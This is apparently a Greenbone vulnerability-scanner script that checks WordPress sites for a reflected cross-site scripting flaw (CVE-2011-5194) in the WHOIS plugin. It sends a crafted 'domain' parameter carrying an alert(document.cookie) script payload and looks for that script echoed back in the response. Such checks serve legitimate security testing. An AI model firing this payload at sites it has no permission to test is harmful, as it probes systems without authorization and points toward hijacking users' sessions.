# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802553");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2011-5194");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-01-04 13:54:24 +0530 (Wed, 04 Jan 2012)");
  script_name("WordPress WHOIS Plugin 'domain' Parameter XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47428/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51244");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108271/wpwhois-xss.txt");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset/482954/wordpress-whois-search");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress WHOIS Plugin version prior to 1.4.2.3");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error in the 'domain' parameter
  in '/wp-content/plugins/wordpress-whois-search/wp-whois-ajax.php' when
  processing user-supplied data.");

  script_tag(name:"solution", value:"Update to WordPress WHOIS Plugin version 1.4.2.3 or later.");

  script_tag(name:"summary", value:"The WordPress plugin 'WHOIS' is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wordpress-whois-search/download/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/wordpress-whois-search/wp-whois-ajax.php?cmd=wpwhoisform&ms=Xss?domain="><script>alert(document.cookie);</script>';

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE)){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
